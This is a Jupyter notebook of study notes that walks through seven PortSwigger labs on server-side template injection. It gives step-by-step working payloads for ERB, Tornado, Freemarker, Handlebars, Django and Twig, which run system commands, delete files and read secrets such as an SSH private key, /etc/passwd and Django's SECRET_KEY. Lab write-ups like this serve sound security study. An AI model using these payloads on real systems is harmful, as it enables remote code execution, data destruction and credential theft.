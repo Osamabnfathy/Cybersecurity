{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "----------------------------------------------------------------------------------\n",
    "                    # Server Side Template Injection Attacks (SSTI)                         "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Used Resources:\n",
    "\n",
    ">> PortSwigger Labs:\n",
    "   - https://portswigger.net/web-security/server-side-template-injection\n",
    "   - https://portswigger.net/web-security/server-side-template-injection/exploiting\n",
    "\n",
    ">> Playlist:\n",
    "   - https://www.youtube.com/playlist?list=PL1GDzLoRwyVCEG_dnWcQDbDXJSBw7lTOT\n",
    "   \n",
    ">> Arab Hack Sploit Video:\n",
    "   - https://www.youtube.com/watch?v=UFxNQ4o1hLI&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=13"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Server Side Template Injection Attacks:\n",
    "\n",
    ">> What is server-side template injection?\n",
    "   - Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.\n",
    "   - Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data.\n",
    "   \n",
    "   \n",
    ">> How do server-side template injection vulnerabilities arise?\n",
    "   - Server-side template injection vulnerabilities arise when user input is concatenated into templates rather than being passed in as data.\n",
    "   - During auditing, we might test for server-side template injection by requesting a URL such as: (http://vulnerable-website.com/?username=${7*7}) >> If the resulting output contains Hello 49, this shows that the mathematical operation is being evaluated server-side. This is a good proof of concept for a server-side template injection vulnerability.\n",
    "\n",
    "\n",
    ">> How to detect server-side template injection:\n",
    "   - use the following payload ( ${{<%[%'\"}}%\\ ) "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-1: Basic server-side template injection:\n",
    "\n",
    ">> Exploit server-side template injection in ERB Template:\n",
    "   - View the details of the first Photo from left\n",
    "   - it will give you a massage\n",
    "   - try to test the Message Param with ERB exploits\n",
    "   - (Syntax : <%= Expression %>) by URL encoding\n",
    "   - So the payload syntax is (GET /?message= <%= 7*7 %>)\n",
    "   - Then let's try some system commands like (<%= system(\"id\") %>)\n",
    "   - Then let's try some system commands like (<%= system(\"ls\") %>)\n",
    "   - if you get the user id in the page then you can execute any code you want\n",
    "   - let's solve the lab by (<%= system (\"rm morale.txt\") %>)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-2: Basic server-side template injection (code context):\n",
    "\n",
    ">> Exploit server-side template injection in Tornado Template:\n",
    "   - log with (wiener:peter)\n",
    "   - open my account tab and see the functionality of preferred name\n",
    "   - make it any thing then type any comment on a post\n",
    "   - see if the the name chaged to preferred name\n",
    "   - see the documentation of the Tornado Template it executes any code in {{}}\n",
    "   - in the request of changing preferred name add }}{{7*7\n",
    "   - then see if the comment name changed to (peter49) or not\n",
    "   - so add the payload of ({% import os %}{{ os.popen(\"ls\").read() }})\n",
    "   - then to delete the file ({% import os %}{{ os.popen(\"rm morale.txt\").read() }})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-3: Server-side template injection using documentation:\n",
    "\n",
    ">> Exploit server-side template injection in unknown Template \"Freemarker\"\n",
    "   - log with (content-manager:C0nt3ntM4n4g3r)\n",
    "   - open any product and edit the Template and save\n",
    "   - intercept the request by burp\n",
    "   - URL-Decode for template param\n",
    "   - change any code in ${} to ${3*3*3} and see the result in the browser\n",
    "   - then it works so search for RCE payloads for Freemarker Template \n",
    "   - The payload for solving the lab is\n",
    "   - ${\"freemarker.template.utility.Execute\"?new()(\"rm morale.txt\")}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-4: Server-side template injection in an unknown language with a documented exploit:\n",
    "\n",
    ">> Exploit server-side template injection in unknown Template:\n",
    "   - open first product\n",
    "   - you'll see a massage\n",
    "   - intercept the request of that massage\n",
    "   - change it to ( ${{<%[%'\"}}%\\ ) to identifies the Template\n",
    "   - search with the Error in google to identify the Template\n",
    "   - the Template is (Handlebars) \n",
    "   - Search for a payload to get RCE and URL Encoding for it (payloadsAllTheThings) \n",
    "   - the payload is (%77%72%74%7a%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-5: Server-side template injection with information disclosure via user-supplied objects:\n",
    "\n",
    ">> Exploit server-side template injection of Django Template:\n",
    "   - log with (content-manager:C0nt3ntM4n4g3r)\n",
    "   - open any post and edit the template\n",
    "   - change any {{}} to {{ ${{<%[%'\"}}%\\ }} to identifies the Template\n",
    "   - Read the dogumentation of Django of how to leak the secret keys\n",
    "   - edit the template and change any {{}} to {{ settings.SECRET_KEY}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-6: Server-side template injection in a sandboxed environment:\n",
    "\n",
    ">> Exploit server-side template injection of FreeMarker template in Sandbox:\n",
    "   - log with (content-manager:C0nt3ntM4n4g3r)\n",
    "   - open any post and edit the template\n",
    "   - change any ${pruduct.} to ${product.test} >> you'll get an error\n",
    "   - from HackTrics page try the FreeMarker (Java) Payloads\n",
    "   - (  <#assign classloader=product.class.protectionDomain.classLoader>\n",
    "        <#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>\n",
    "        <#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>\n",
    "        <#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>\n",
    "        ${dwf.newInstance(ec,null)(\"ls\")}  )\n",
    "   - change (\"ls\") to (\"cat my_password.txt\")\n",
    "   \n",
    "   \n",
    "   - OR (${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(\" \")})\n",
    "   - Then encode the Result to (Hex) and Decode it to (ASCII Hex) to get the result\n",
    "   "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-7: Server-side template injection with a custom exploit:\n",
    "\n",
    ">> Exploit \n",
    "   - log with (wiener:peter)\n",
    "   - intercept the request of changing display name and make a change in it to get error\n",
    "   - make it (blog-post-author-display=user) and see the error\n",
    "   - The error tells you that the template is (Twig PHP Template)\n",
    "   - now try to upload any photo to the avatar and see the request\n",
    "   - you'll see that it have (setAvatar) function, lets use it in our template\n",
    "   - the payload of changing display name will be (user.setAvatar()) and see the error\n",
    "   - it needs 2 params lets pass 2 params from the error\n",
    "   - (user.setAvatar('/etc/passwd','image/jpg'))\n",
    "   - Get the response by changing any GET request to (GET /avatar/avatar=wiener)\n",
    "   - now change it to payload is (user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg'))\n",
    "   - Now we need to remove the file (.ssh/id_rsa)\n",
    "   - the payload is (user.setAvatar('/home/carlos/User.php','image/jpg')) to see the function allowed to delete the file\n",
    "   - we found the public function (gdprDelete())\n",
    "   - now send the payload (user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')) again\n",
    "   - and Reload the lab page\n",
    "   - then change the payload to (user.gdprDelete()) and send\n",
    "   - Reload the lab page \n",
    "   - now it's solved :)"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
